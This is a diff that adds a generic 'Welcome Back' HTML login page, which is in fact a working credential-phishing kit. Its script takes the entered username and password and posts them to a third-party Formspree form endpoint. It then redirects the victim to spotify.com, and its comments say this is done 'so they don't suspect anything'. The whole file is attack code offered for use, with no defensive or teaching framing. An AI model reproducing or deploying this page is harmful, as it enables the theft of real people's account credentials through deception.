@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+        }
+        h2 { margin-bottom: 20px; color: #333; }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover { background-color: #0056b3; }
+        .error { color: red; font-size: 12px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Welcome Back</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username or Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+    <p class="error" id="errorMsg">Invalid credentials</p>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Stop the form from refreshing the page
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // 1. Send data to yourself using Formspree (Free tier)
+        try {
+            await fetch("https://formspree.io/f/mrppypvd", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username: username, password: password })
+            });
+            
+            // 2. Redirect to the REAL site so they don't suspect anything
+            window.location.href = "https://www.spotify.com"; // Change this to the real site
+            
+        } catch (error) {
+            console.error("Error:", error);
+            document.getElementById('errorMsg').style.display = 'block';
+        }
+    });
+</script>
+
+</body>
+</html>
